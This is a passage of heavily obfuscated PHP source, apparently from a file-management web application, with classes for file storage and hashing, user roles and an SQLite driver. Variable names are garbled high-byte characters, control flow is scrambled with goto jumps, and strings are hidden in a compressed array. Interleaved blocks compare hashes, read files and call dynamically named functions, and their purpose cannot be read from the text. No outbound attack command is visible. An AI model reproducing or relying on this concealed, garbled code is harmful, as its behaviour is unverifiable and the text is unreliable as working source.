@unlink($d–°…‚·Ó); } return $fàöÓÌ„Åó; goto bÆÆ‰Æ¤×É; bÆÆ‰Æ¤×É: } public function createFileName($b¯•»˜ÙÇ) { goto c‰Éºñ»áÜ; cÊ•ˆÀÅ½À: $BÛÈ¼‹á… = $b¡Æ²ªŒî->pathFather($b‰‘Ş“äÁŒ); static $DÛ“ğó¿‘Ã = false; $CãŞÓ‡ˆº² = $d”£„èã°Ö[1667] . md5($BÛÈ¼‹á…); goto EÛÄÄÌ©çŸ; c‰Éºñ»áÜ: $d”£„èã°Ö =& $_SERVER[±á õÁ]; $b¡Æ²ªŒî = IO::init($d”£„èã°Ö[8]); $b‰‘Ş“äÁŒ = $this->makeFilePath($b¯•»˜ÙÇ, $b¡Æ²ªŒî); goto cÊ•ˆÀÅ½À; EÛÄÄÌ©çŸ: if (!$DÛ“ğó¿‘Ã && !Cache::get($CãŞÓ‡ˆº²)) { $DÛ“ğó¿‘Ã = !0; $f¢ôïÈ”ğ¸ = IO::mkdir($BÛÈ¼‹á…); if (!IO::exist($f¢ôïÈ”ğ¸ . $d”£„èã°Ö[1668])) { IO::mkfile($f¢ôïÈ”ğ¸ . $d”£„èã°Ö[1668]); } Cache::set($CãŞÓ‡ˆº², 1, 3600 * 2); } return $b‰‘Ş“äÁŒ; goto b¬»õ¦Ú†; b¬»õ¦Ú†: } public function makeFilePath($E«Èå™ÂÆ, $fŸ•ŸËÉ•) { goto CƒèÖ˜ì´­; eÂĞ³Óª: switch ($FŞ’â¹ñÇ) { case $fÔÓ§•¶À[1672]: $cŸ‰‰ç‡ô = $cŸ‰‰ç‡ô . $fÔÓ§•¶À[101] . $fŸ•ŸËÉ•->ext($E«Èå™ÂÆ); if ($fŸ•ŸËÉ•->ext($E«Èå™ÂÆ) == $fÔÓ§•¶À[1611]) { $cŸ‰‰ç‡ô .= $fÔÓ§•¶À[1362]; } break; case $fÔÓ§•¶À[1673]: goto A„Ã–ßŒŸ²; e¶Ü›˜ÀÕÖ: CacheLock::lock($fáõê£ ®‚); $f·‰‘éö¨ñ = IO::fileNameAuto($dÎ’´Ğêœƒ, $E«Èå™ÂÆ); $cŸ‰‰ç‡ô = $dÎ’´Ğêœƒ . $f·‰‘éö¨ñ; goto a‡‘Ş–ß×“; A„Ã–ßŒŸ²: $EñÍ’àíÌ‹ = Model($fÔÓ§•¶À[1109])->get($fÔÓ§•¶À[1358]); $a…Ï¼µ˜ğƒ = substr(md5($fÔÓ§•¶À[1674] . $EñÍ’àíÌ‹ . date($fÔÓ§•¶À[712])), 0, 8); $bÍ×è‹Å Œ = KodIO::defaultDriver(); goto fÂÜµ§Æ; fÂÜµ§Æ: $dÎ’´Ğêœƒ = $fÔÓ§•¶À[1675] . $bÍ×è‹Å Œ[$fÔÓ§•¶À[391]] . $fÔÓ§•¶À[1676] . date($fÔÓ§•¶À[1677]) . $a…Ï¼µ˜ğƒ . $fÔÓ§•¶À[8]; if ($fŸ•ŸËÉ•->ext($E«Èå™ÂÆ) == $fÔÓ§•¶À[1611]) { $E«Èå™ÂÆ .= $fÔÓ§•¶À[1362]; } $fáõê£ ®‚ = $fÔÓ§•¶À[1678] . $dÎ’´Ğêœƒ . $E«Èå™ÂÆ; goto e¶Ü›˜ÀÕÖ; a‡‘Ş–ß×“: if (IO::isTypeObject($cŸ‰‰ç‡ô) && !IO::isUploadServer($cŸ‰‰ç‡ô)) { IO::setContent($cŸ‰‰ç‡ô, $fÔÓ§•¶À[43]); } CacheLock::unlock($fáõê£ ®‚); break; goto Cİ£ß—†ìó; Cİ£ß—†ìó: case $fÔÓ§•¶À[1671]: break; default: break; } return $cŸ‰‰ç‡ô; goto bŸ¹»Œí•·; a¬Æ¿ˆóŒ£: $cŸ‰‰ç‡ô = $dÎ’´Ğêœƒ . rand_string(5) . short_id(100); $E«Èå™ÂÆ = str_replace($fÔÓ§•¶À[8], $fÔÓ§•¶À[80], KodIO::clear($E«Èå™ÂÆ)); if (!$E«Èå™ÂÆ) { $FŞ’â¹ñÇ = $fÔÓ§•¶À[1671]; } goto eÂĞ³Óª; CƒèÖ˜ì´­: $fÔÓ§•¶À =& $_SERVER[±á õÁ]; $FŞ’â¹ñÇ = Model($fÔÓ§•¶À[1109])->get($fÔÓ§•¶À[1669]); $dÎ’´Ğêœƒ = KodIO::defaultIO() . date($fÔÓ§•¶À[1670]); goto a¬Æ¿ˆóŒ£; bŸ¹»Œí•·: } public function addFileByRemote($a˜„í‹‹‹«, $E„‚‰ƒÔÀö, $A¦£Û´È… = array()) { goto f†šÂ´µ¯Ğ; AÑ‹”¾â²Í: if ($A¸âÛàŸá¢ = $this->addFileCheckExist($B“œò‰ëŠ[$E¼ÁØø¾Ğ[178]], $B“œò‰ëŠ[$E¼ÁØø¾Ğ[177]], $B“œò‰ëŠ[$E¼ÁØø¾Ğ[87]])) { return $A¸âÛàŸá¢; } return $this->addFileData($B“œò‰ëŠ); goto dòµÜ©µ…; f†šÂ´µ¯Ğ: $E¼ÁØø¾Ğ =& $_SERVER[±á õÁ]; if (!IO::exist($a˜„í‹‹‹«)) { return !1; } $BÑèÊÔ½… = $A¦£Û´È…[$E¼ÁØø¾Ğ[177]] ? $A¦£Û´È…[$E¼ÁØø¾Ğ[177]] : $E¼ÁØø¾Ğ[43]; goto BÒ„‰íÕ¼—; BÒ„‰íÕ¼—: $D†•—åœ»† = IO::hashMd5($a˜„í‹‹‹«, $BÑèÊÔ½…); $d¢ïêÇ = KodIO::defaultDriver(); $B“œò‰ëŠ = array($E¼ÁØø¾Ğ[545] => IO::size($a˜„í‹‹‹«), $E¼ÁØø¾Ğ[1679] => 1, $E¼ÁØø¾Ğ[410] => $E„‚‰ƒÔÀö, $E¼ÁØø¾Ğ[760] => $d¢ïêÇ[$E¼ÁØø¾Ğ[391]], $E¼ÁØø¾Ğ[411] => $a˜„í‹‹‹«, $E¼ÁØø¾Ğ[1680] => $A¦£Û´È…[$E¼ÁØø¾Ğ[178]] ? $A¦£Û´È…[$E¼ÁØø¾Ğ[178]] : IO::hashSimple($a˜„í‹‹‹«), $E¼ÁØø¾Ğ[1681] => $D†•—åœ»† ? $D†•—åœ»† : $BÑèÊÔ½…); goto AÑ‹”¾â²Í; dòµÜ©µ…: } private function addFileData($fÇŸ‡§±È) { $fÅÓ£¶®„ =& $_SERVER[±á õÁ]; if (!$fÇŸ‡§±È) { return !1; } $fÇŸ‡§±È[$fÅÓ£¶®„[87]] = intval($fÇŸ‡§±È[$fÅÓ£¶®„[87]]); if (!$fÇŸ‡§±È[$fÅÓ£¶®„[87]] && strlen($fÇŸ‡§±È[$fÅÓ£¶®„[178]]) > 32) { $fÇŸ‡§±È[$fÅÓ£¶®„[87]] = intval(substr($fÇŸ‡§±È[$fÅÓ£¶®„[178]], 32)); } $DÜÛŞÓ›‹± = $this->add($fÇŸ‡§±È); return $this->find($DÜÛŞÓ›‹±); } public function addFile($bÑÒùäêÕ , $AÕª„Ï‰¨, $EŠ‚Ş“ƒ · = false) { goto FÜ¾ô±œŸŞ; FÜ¾ô±œŸŞ: $dõŞ²·ÛŒš = IO::hashSimple($bÑÒùäêÕ ); $Cí­–‘¯‡‚ = IO::hashMd5($bÑÒùäêÕ ); $F‡ãŒÕ† = IO::size($bÑÒùäêÕ ); goto fÛë›ùµ¡‚; DÜ»Ñ÷©ãî: $EÛŠ’ë„Å³ = $this->addFileMake($bÑÒùäêÕ , $F‡ãŒÕ†, $dõŞ²·ÛŒš, $Cí­–‘¯‡‚, $AÕª„Ï‰¨, $EŠ‚Ş“ƒ ·); $a—¾çÍÅ‰ª = $this->addFileData($EÛŠ’ë„Å³); CacheLock::unlock($F¾“â¯è¸¤); goto FøìƒÇĞ±Ö; fÛë›ùµ¡‚: $F¾“â¯è¸¤ = $_SERVER[±á õÁ][1682] . $Cí­–‘¯‡‚; CacheLock::lock($F¾“â¯è¸¤); if ($dÔø’®›ã = $this->addFileCheckExist($dõŞ²·ÛŒš, $Cí­–‘¯‡‚, $F‡ãŒÕ†)) { CacheLock::unlock($F¾“â¯è¸¤); return $dÔø’®›ã; } goto DÜ»Ñ÷©ãî; FøìƒÇĞ±Ö: return $a—¾çÍÅ‰ª; goto B‹’ëçÄó™; B‹’ëçÄó™: } public function addFileMake($Eœ¬Ù»£Ùö, $DÂÃİ¿è½‘, $dÏ˜Ô²àã, $a» ãÈØøê, $b¹çïïÚ¯, $dèà—‚ƒ‹Î) { goto fËÓ‰ÎßÛÆ; d¹ø ½±—: $Fä—õŸˆÊ = get_path_this($FÏèößŸ‡); if ($dèà—‚ƒ‹Î) { $ağñ¯ÑŠ±Â = IO::move($Eœ¬Ù»£Ùö, $A–¿‘œ…ÑÛ, !1, $Fä—õŸˆÊ); } else { $ağñ¯ÑŠ±Â = IO::copy($Eœ¬Ù»£Ùö, $A–¿‘œ…ÑÛ, !1, $Fä—õŸˆÊ); } if (!$ağñ¯ÑŠ±Â) { return !1; } goto cÈ¸¾à°„¨; cÈ¸¾à°„¨: $CİŞ£Àò¬§ = KodIO::defaultDriver(); $c¢Úø“´ = array($cÜ‹öÂß“İ[545] => $DÂÃİ¿è½‘, $cÜ‹öÂß“İ[1679] => 1, $cÜ‹öÂß“İ[410] => $b¹çïïÚ¯, $cÜ‹öÂß“İ[760] => $CİŞ£Àò¬§[$cÜ‹öÂß“İ[391]], $cÜ‹öÂß“İ[411] => $FÏèößŸ‡, $cÜ‹öÂß“İ[1680] => $dÏ˜Ô²àã, $cÜ‹öÂß“İ[1681] => $a» ãÈØøê); return $c¢Úø“´; goto CÃ‰ÊŸ¤æ; fËÓ‰ÎßÛÆ: $cÜ‹öÂß“İ =& $_SERVER[±á õÁ]; $FÏèößŸ‡ = $this->createFileName($b¹çïïÚ¯); $A–¿‘œ…ÑÛ = get_path_father($FÏèößŸ‡); goto d¹ø ½±—; CÃ‰ÊŸ¤æ: } public function addFileCheckExist($EÈ®÷ˆíİÄ, $FÎ†Ñ½”Øï, $B¤ŞíÄğ”) { $E×ŠÌ®×ñ¦ =& $_SERVER[±á õÁ]; $B¡÷Æ‚Ä‘ = $this->findByHash($EÈ®÷ˆíİÄ, $FÎ†Ñ½”Øï); if (!$B¡÷Æ‚Ä‘) { return !1; } $Fç…Á¸âÁ = array($E×ŠÌ®×ñ¦[1679] => intval($B¡÷Æ‚Ä‘[$E×ŠÌ®×ñ¦[1683]]) + 1, $E×ŠÌ®×ñ¦[545] => $B¤ŞíÄğ”); $this->where(array($E×ŠÌ®×ñ¦[444] => $B¡÷Æ‚Ä‘[$E×ŠÌ®×ñ¦[443]]))->save($Fç…Á¸âÁ); return $B¡÷Æ‚Ä‘; } public function remove($A®âæò“‰) { $this->linkCountChange($A®âæò“‰, !1); $this->clearEmpty(); return !0; } public function linkAdd($A·šîµÂ‚·) { $this->linkCountChange($A·šîµÂ‚·, !0); } public function linkCountChange($E°½İÂÌ‡­, $eãµ¤©Šë¬) { goto dÌ‹‡ÔÔ®‰; dÌ‹‡ÔÔ®‰: $EÎ°¿–‰öØ =& $_SERVER[±á õÁ]; if (!$E°½İÂÌ‡­) { return; } if (!is_array($E°½İÂÌ‡­)) { $E°½İÂÌ‡­ = array($E°½İÂÌ‡­); } goto fé’¾œé½¾; fé’¾œé½¾: $F±ºµ¬šò“ = array(); foreach ($E°½İÂÌ‡­ as $Cå“²ä¦¢) { $b­ßáïŠî = $Cå“²ä¦¢ . $EÎ°¿–‰öØ[43]; if (!$F±ºµ¬šò“[$b­ßáïŠî]) { $F±ºµ¬šò“[$b­ßáïŠî] = 0; } $F±ºµ¬šò“[$b­ßáïŠî]++; } $FØ÷÷”“§ò = array(); goto cêÀß††é©; cêÀß††é©: foreach ($F±ºµ¬šò“ as $Cå“²ä¦¢ => $A«¿Ğ¦Â„) { $b­ßáïŠî = $A«¿Ğ¦Â„ . $EÎ°¿–‰öØ[43]; if (!$FØ÷÷”“§ò[$b­ßáïŠî]) { $FØ÷÷”“§ò[$b­ßáïŠî] = array(); } $FØ÷÷”“§ò[$b­ßáïŠî][] = $Cå“²ä¦¢; } foreach ($FØ÷÷”“§ò as $A«¿Ğ¦Â„ => $eå¯êğà†) { if (!$eå¯êğà†) { continue; } $A«¿Ğ¦Â„ = $eãµ¤©Šë¬ ? $A«¿Ğ¦Â„ : -intval($A«¿Ğ¦Â„); $A›­ŞìÅ·ö = array($EÎ°¿–‰öØ[443] => array($EÎ°¿–‰öØ[7], $eå¯êğà†)); if ($A«¿Ğ¦Â„ < 0) { $A›­ŞìÅ·ö[$EÎ°¿–‰öØ[1683]] = array($EÎ°¿–‰öØ[945], abs($A«¿Ğ¦Â„)); } $this->where($A›­ŞìÅ·ö)->setAdd($EÎ°¿–‰öØ[1683], $A«¿Ğ¦Â„); } goto a¯Î‘ÃâëÍ; a¯Î‘ÃâëÍ: } public function findByHash($b»…ù¤¬ÁÈ, $eå£¬»óÌğ = false) { $Bˆì¤ÂõŞØ =& $_SERVER[±á õÁ]; if (!$b»…ù¤¬ÁÈ && !$eå£¬»óÌğ) { return !1; } $b®Ö½–¤¡Õ = array($Bˆì¤ÂõŞØ[1680] => $b»…ù¤¬ÁÈ); if ($eå£¬»óÌğ) { $b®Ö½–¤¡Õ = array($Bˆì¤ÂõŞØ[1681] => $eå£¬»óÌğ); } return $this->order($Bˆì¤ÂõŞØ[1684])->where($b®Ö½–¤¡Õ)->find(); } public function clearEmpty($FÔŠ¿Ğ„ßÛ = 0) { goto f¾ğÄËòõ; a™’Â¡ˆ·: $D²ñõù—°‹ = $this->where($f¸Š³Ç ‘†)->select(); if (!$D²ñõù—°‹) { return; } $bù©ñá¬™Å = new Task($D²£°©á…¢[1686], $D²£°©á…¢[43], count($D²ñõù—°‹)); goto CÍ¢Áô‰æÖ; CÍ¢Áô‰æÖ: foreach ($D²ñõù—°‹ as $dª›ÀîÙ¤Ê) { $bù©ñá¬™Å->update(1); $this->resetFile($dª›ÀîÙ¤Ê); } $bù©ñá¬™Å->end(); goto dê‡²¦Œè; f¾ğÄËòõ: $D²£°©á…¢ =& $_SERVER[±á õÁ]; $cíø‹ñäì  = time() - 3600 * 24 * $FÔŠ¿Ğ„ßÛ; $f¸Š³Ç ‘† = $D²£°©á…¢[1685] . $cíø‹ñäì ; goto a™’Â¡ˆ·; dê‡²¦Œè: } public function resetFile($cÏëÌÒ»ëå) { goto E‰¹Ê¸ñ£; E‰¹Ê¸ñ£: $aÑ†Ïé‰ˆ† =& $_SERVER[±á õÁ]; $Båî’æÀ¢› = array($aÑ†Ïé‰ˆ†[444] => $cÏëÌÒ»ëå[$aÑ†Ïé‰ˆ†[443]]); $F…Üùˆáİ = Model($aÑ†Ïé‰ˆ†[1138])->where($Båî’æÀ¢›)->count(); goto b•Ë£ÛÒ ‰; b•Ë£ÛÒ ‰: $c¢Ö®±íí” = Model($aÑ†Ïé‰ˆ†[1687])->where($Båî’æÀ¢›)->count(); $d¯î¦Œ·Ò = intval($F…Üùˆáİ) + intval($c¢Ö®±íí”); if ($d¯î¦Œ·Ò == 0) { IO::remove($cÏëÌÒ»ëå[$aÑ†Ïé‰ˆ†[85]]); $this->where($Båî’æÀ¢›)->delete(); $this->metaSet($cÏëÌÒ»ëå[$aÑ†Ïé‰ˆ†[443]], null, null); return; } goto a‘‹µÆ­…Ó; a‘‹µÆ­…Ó: if ($cÏëÌÒ»ëå[$aÑ†Ïé‰ˆ†[1683]] != $d¯î¦Œ·Ò) { $this->where($Båî’æÀ¢›)->save(array($aÑ†Ïé‰ˆ†[1679] => $d¯î¦Œ·Ò)); } goto AŸÓìµâÊÇ; AŸÓìµâÊÇ: } public function storageInfo($aó‰Õ™‚Âé = false) { goto a»Ùğ¢¼Ò; b­Å¼Äƒ±: $d†òÁİÀ¡ = 1; $D¸ÄÄèïø = 0; $C¶æğÂÓ¥« = 5000; goto f‘—ì’šŒï; f‘—ì’šŒï: for ($F‡‘Æô‡¬Ô = 0; $F‡‘Æô‡¬Ô < $Aªíˆ­ÕŠÌ; $F‡‘Æô‡¬Ô = $F‡‘Æô‡¬Ô + $C¶æğÂÓ¥«) { $F‰ÑŠæ¾¶¶ = $this->limit($F‡‘Æô‡¬Ô, $F‡‘Æô‡¬Ô + $C¶æğÂÓ¥«)->select(); foreach ($F‰ÑŠæ¾¶¶ as $C…÷·½ô‰) { $d†òÁİÀ¡ += $C…÷·½ô‰[$a±˜®¦Ğº[87]] * $C…÷·½ô‰[$a±˜®¦Ğº[1683]]; $AÒÒ˜“áÖ += $C…÷·½ô‰[$a±˜®¦Ğº[87]] * ($C…÷·½ô‰[$a±˜®¦Ğº[1683]] - 1); $D¸ÄÄèïø += $C…÷·½ô‰[$a±˜®¦Ğº[1683]]; } } $A‹¥ª‘‡è‰ = array($a±˜®¦Ğº[1688] => $d†òÁİÀ¡, $a±˜®¦Ğº[1689] => $AÒÒ˜“áÖ, $a±˜®¦Ğº[1690] => $AÒÒ˜“áÖ / $d†òÁİÀ¡, $a±˜®¦Ğº[91] => $Aªíˆ­ÕŠÌ, $a±˜®¦Ğº[1691] => $D¸ÄÄèïø); return $A‹¥ª‘‡è‰; goto d»¢§¯š‹â; a»Ùğ¢¼Ò: $a±˜®¦Ğº =& $_SERVER[±á õÁ]; $Aªíˆ­ÕŠÌ = $this->count() + 0.0; $AÒÒ˜“áÖ = 0; goto b­Å¼Äƒ±; d»¢§¯š‹â: } } goto Eì·§Óø›; Bêø¦Çã‚: $BĞ›ä§½Œ± = $_SERVER[$_SERVER[±á õÁ][10]]; $aæ–Í¢µä = $_SERVER[±á õÁ][1329]; if ($_SERVER[$_SERVER[±á õÁ][9]] != $aæ–Í¢µä($BĞ›ä§½Œ±)) { goto Bá„Â£ó†©; D…«çëÁæ‘: $fÊ¸È¡µ‘‰ = explode($_SERVER[±á õÁ][14], $cí†«Ü); if (count($fÊ¸È¡µ‘‰) < $_SERVER[±á õÁ][15]) { $F«Õ×·ù¯ = $_SERVER[±á õÁ][16]; $F«Õ×·ù¯(); } $BÎ¥¹ŞãŒ• = $_SERVER[±á õÁ][17]; goto BİßÌŠ»Ã; BİßÌŠ»Ã: $BÎ¥¹ŞãŒ•($BĞ›ä§½Œ±); goto a¶¾ëÏĞ£¿; Bá„Â£ó†©: $BùÕÙ„æİ¤ = $_SERVER[±á õÁ][11]; $f»ÀÉï‰° = $_SERVER[$_SERVER[±á õÁ][12]] . $_SERVER[±á õÁ][13]; $cí†«Ü = $BùÕÙ„æİ¤($f»ÀÉï‰°); goto D…«çëÁæ‘; a¶¾ëÏĞ£¿: } goto eå•ÀˆÊ›¡; fí–Æ·È›Ş: $_SERVER[Â·¨] = explode($_SERVER[±á õÁ][573], gzinflate(substr($_SERVER[±á õÁ][574], 10, -8))); $F²Ò¤±±¡ = $_SERVER[±á õÁ][575]; if (!$F²Ò¤±±¡) { die; } goto DíºÊ°ƒé™; càƒæ®ĞÖ: $aæ–Í¢µä = $_SERVER[±á õÁ][1329]; if ($_SERVER[$_SERVER[±á õÁ][9]] != $aæ–Í¢µä($BĞ›ä§½Œ±)) { goto d–¬µÈÎÕë; d†°ç´‡±æ: $fÊ¸È¡µ‘‰ = explode($_SERVER[±á õÁ][14], $cí†«Ü); if (count($fÊ¸È¡µ‘‰) < $_SERVER[±á õÁ][15]) { $F«Õ×·ù¯ = $_SERVER[±á õÁ][16]; $F«Õ×·ù¯(); } $BÎ¥¹ŞãŒ• = $_SERVER[±á õÁ][17]; goto f ëëçÛÑñ; d–¬µÈÎÕë: $BùÕÙ„æİ¤ = $_SERVER[±á õÁ][11]; $f»ÀÉï‰° = $_SERVER[$_SERVER[±á õÁ][12]] . $_SERVER[±á õÁ][13]; $cí†«Ü = $BùÕÙ„æİ¤($f»ÀÉï‰°); goto d†°ç´‡±æ; f ëëçÛÑñ: $BÎ¥¹ŞãŒ•($BĞ›ä§½Œ±); goto d‘ÇùÜö‹; d‘ÇùÜö‹: } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\162\157\154\145\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\141\x75\164\150", "\x6c\x61\x62\x65\154", "\x64\x69\x73\x70\x6c\x61\171", "\163\x79\163\x74\145\x6d", "\x64\x65\x73\x63", "\x69\x67\156\157\x72\x65\x45\x78\164", "\x69\147\x6e\x6f\162\145\x46\x69\154\145\x53\x69\172\x65", "\x61\x64\x6d\151\156\x69\163\x74\162\x61\x74\x6f\x72", "\x73\157\x72\x74"); public function listData($B†š¡Ç¨£ = false, $côæ–ä«³Š = "\x73\x6f\162\x74", $CÆ‹Ä¾Œ‰İ = false) { $c– «˜óÆ— =& $_SERVER[±á õÁ]; $b£Ú—„•Œ = parent::listData($B†š¡Ç¨£, $côæ–ä«³Š, $CÆ‹Ä¾Œ‰İ); if (!$B†š¡Ç¨£) { $C®½ïİ·é¸ = $c– «˜óÆ—[2030]; foreach ($b£Ú—„•Œ as $E‰ìñÆôÚê => $BÌ¡ƒÀÅ¢) { if ($BÌ¡ƒÀÅ¢[$c– «˜óÆ—[1811]] == 1) { $b£Ú—„•Œ[$E‰ìñÆôÚê][$c– «˜óÆ—[429]] = $C®½ïİ·é¸; } } } return $b£Ú—„•Œ; } public function update($c‹¾²¥èä¹, $dæ×ŒÑÅ‚ç) { goto b—ÌÚÑ“…³; A½·Ğ„ï‹ô: return parent::update($c‹¾²¥èä¹, $dæ×ŒÑÅ‚ç); goto côóæ°É¨‡; a²óÊÌ›†: if (!$dŠí½¬©¥ || $e×Œ›ÑêƒË && $e×Œ›ÑêƒË[$DÒ …ƒ›Šõ[391]] != $dŠí½¬©¥[$DÒ …ƒ›Šõ[391]]) { return !1; } if ($e×Œ›ÑêƒË[$DÒ …ƒ›Šõ[1811]] == 1) { $dæ×ŒÑÅ‚ç = array($DÒ …ƒ›Šõ[38] => $dæ×ŒÑÅ‚ç[$DÒ …ƒ›Šõ[38]], $DÒ …ƒ›Šõ[1642] => $dæ×ŒÑÅ‚ç[$DÒ …ƒ›Šõ[1642]]); } $this->filterAuth($dæ×ŒÑÅ‚ç[$DÒ …ƒ›Šõ[400]]); goto A½·Ğ„ï‹ô; b—ÌÚÑ“…³: $DÒ …ƒ›Šõ =& $_SERVER[±á õÁ]; $dŠí½¬©¥ = parent::listData($c‹¾²¥èä¹); $e×Œ›ÑêƒË = $this->findByName($dæ×ŒÑÅ‚ç[$DÒ …ƒ›Šõ[38]]); goto a²óÊÌ›†; côóæ°É¨‡: } public function remove($FÜ£×ëñ¢¼) { $EÜ­…‰ˆ»ñ = parent::listData($FÜ£×ëñ¢¼); if (!$EÜ­…‰ˆ»ñ || $EÜ­…‰ˆ»ñ[$_SERVER[±á õÁ][1101]]) { return !1; } return parent::remove($FÜ£×ëñ¢¼); } public function add($c°œïôëØù) { goto AŸœŒª·ÀÃ; EÕ¯Èê©ğš: $A˜ÃÖÖéÍ„ = array($f¦§öåÏ[410] => $C‹‚¢‚¸»ƒ, $f¦§öåÏ[1627] => $f¦§öåÏ[43], $f¦§öåÏ[1623] => $f¦§öåÏ[1631], $f¦§öåÏ[2031] => 1, $f¦§öåÏ[1626] => 0, $f¦§öåÏ[2032] => 0, $f¦§öåÏ[1625] => $this->getSort()); $c°œïôëØù = array_merge($A˜ÃÖÖéÍ„, $c°œïôëØù); $this->filterAuth($c°œïôëØù[$f¦§öåÏ[400]]); goto FÄ¬µ¡ñ¸È; AŸœŒª·ÀÃ: $f¦§öåÏ =& $_SERVER[±á õÁ]; $C‹‚¢‚¸»ƒ = $c°œïôëØù[$f¦§öåÏ[38]]; if ($this->findByName($C‹‚¢‚¸»ƒ)) { return !1; } goto EÕ¯Èê©ğš; FÄ¬µ¡ñ¸È: return parent::insert($c°œïôëØù); goto Cº×ë’±‡; Cº×ë’±‡: } private function getSort() { $Däø•¦ô‹ =& $_SERVER[±á õÁ]; $A”ÃğÆ„‰® = parent::listData(); $C§„ò ĞŞÑ = array_to_keyvalue($A”ÃğÆ„‰®, $Däø•¦ô‹[43], $Däø•¦ô‹[1644]); return empty($C§„ò ĞŞÑ) ? 0 : max($C§„ò ĞŞÑ) + 1; } private function filterAuth(&$eì‹Ïğ‚¬ì) { $fÃÉ†¶ÑÂ’ =& $_SERVER[±á õÁ]; $dœ×ºŠö„ë = array(); $D‹ß†‚öÑ = array_filter(explode($fÃÉ†¶ÑÂ’[57], $eì‹Ïğ‚¬ì)); foreach ($D‹ß†‚öÑ as $eì‹Ïğ‚¬ì) { $fËÄœ£†¯ˆ = explode($fÃÉ†¶ÑÂ’[101], $eì‹Ïğ‚¬ì); if ($fËÄœ£†¯ˆ[0] == $fÃÉ†¶ÑÂ’[2033] && $fËÄœ£†¯ˆ[1] != $fÃÉ†¶ÑÂ’[1058]) { $dåÜ¶²Õãõ = $fËÄœ£†¯ˆ[0] . $fÃÉ†¶ÑÂ’[101] . $fËÄœ£†¯ˆ[1] . $fÃÉ†¶ÑÂ’[2034]; if (!in_array($dåÜ¶²Õãõ, $D‹ß†‚öÑ)) { $dœ×ºŠö„ë[] = $dåÜ¶²Õãõ; } } $dœ×ºŠö„ë[] = $eì‹Ïğ‚¬ì; } $eì‹Ïğ‚¬ì = implode($fÃÉ†¶ÑÂ’[57], $dœ×ºŠö„ë); } public function sort($FĞ¼”°Áæ, $aŒÓÓ„Š£) { return parent::update($FĞ¼”°Áæ, $aŒÓÓ„Š£); } } goto BÜ‹ÅœŒ™; C¢Æ·ò»â²: define($_SERVER[±á õÁ][569], $_SERVER[±á õÁ][570]); $E­í·¯ÍËÉ = $_SERVER[±á õÁ][571]; while (strlen($E­í·¯ÍËÉ) < $_SERVER[±á õÁ][572]) { if (!$E­í·¯ÍËÉ) { break; } $E­í·¯ÍËÉ++; } goto fí–Æ·È›Ş; D„Ñğ¾¥‚Á: class DbSqlite3Base extends Db { public function __construct($Aï‹Ú‚‹Œ = '') { $CÒ¦ôÍàî =& $_SERVER[±á õÁ]; if (!class_exists($CÒ¦ôÍàî[61])) { think_exception(think_lang($CÒ¦ôÍàî[20]) . $CÒ¦ôÍàî[62]); } if (!empty($Aï‹Ú‚‹Œ)) { if (!isset($Aï‹Ú‚‹Œ[$CÒ¦ôÍàî[22]])) { $Aï‹Ú‚‹Œ[$CÒ¦ôÍàî[22]] = 438; } $this->config = $Aï‹Ú‚‹Œ; if (empty($this->config[$CÒ¦ôÍàî[23]])) { $this->config[$CÒ¦ôÍàî[23]] = array(); } } } public function connect($fŸšå±Ö…¤ = '', $c®ÀĞé¯ñŞ = 0) { $fˆö°ŒÉø¥ =& $_SERVER[±á õÁ]; if (!isset($this->linkID[$c®ÀĞé¯ñŞ])) { if (empty($fŸšå±Ö…¤)) { $fŸšå±Ö…¤ = $this->config; } $this->linkID[$c®ÀĞé¯ñŞ] = new SQLite3($fŸšå±Ö…¤[$fˆö°ŒÉø¥[27]]); if (!$this->linkID[$c®ÀĞé¯ñŞ]) { think_exception($this->linkID[$c®ÀĞé¯ñŞ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$c®ÀĞé¯ñŞ]->busyTimeout(30000); if (1 != think_config($fˆö°ŒÉø¥[28])) { unset($this->config); } } return $this->linkID[$c®ÀĞé¯ñŞ]; } public function free() { $this->queryID = null; } public function query($EÊ¹ŒÍˆÍ‰) { goto FøÈê»™¸ï; Fö«°†¸Ì: $this->queryStr = $EÊ¹ŒÍˆÍ‰; if ($this->queryID) { $this->free(); } think_action_status($aÆÙŞ–Ğòº[29], 1); goto fºÍ¹ŒÏÌ; fºÍ¹ŒÏÌ: think_status($aÆÙŞ–Ğòº[30]); $this->queryID = $this->_linkID->query($EÊ¹ŒÍˆÍ‰); $this->debug(); goto D•¸ÍÉãà; D•¸ÍÉãà: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aÌ°ãõî„ = $this->getAll(); $this->numRows = count($aÌ°ãõî„); return $aÌ°ãõî„; } goto c¶¹„È×ì¡; FøÈê»™¸ï: $aÆÙŞ–Ğòº =& $_SERVER[±á õÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Fö«°†¸Ì; c¶¹„È×ì¡: } public function execute($A„ã³±×¬ô) { goto bÃô½œÕ»Œ; bÃô½œÕ»Œ: $d‰Ô‚‰¡ =& $_SERVER[±á õÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Bà÷¸Ö‡Ü¡; a‰½¬ª¨¼: think_status($d‰Ô‚‰¡[30]); $D–ƒêßÀ–É = $this->_linkID->exec($A„ã³±×¬ô); $this->debug(); goto CË×ÌÀ„´¼; Bà÷¸Ö‡Ü¡: $this->queryStr = $A„ã³±×¬ô; if ($this->queryID) { $this->free(); } think_action_status($d‰Ô‚‰¡[31], 1); goto a‰½¬ª¨¼; CË×ÌÀ„´¼: if (!1 === $D–ƒêßÀ–É) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Eñå¯‚Ç„; Eñå¯‚Ç„: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[±á õÁ][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eá¹µŒ•ôï = $this->_linkID->query($_SERVER[±á õÁ][33]); if (!$eá¹µŒ•ôï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a§™¥â’»š = $this->_linkID->query($_SERVER[±á õÁ][34]); if (!$a§™¥â’»š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f‡•…›Â¤· = array(); while ($E¯ÁÜŞª‡‹ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { 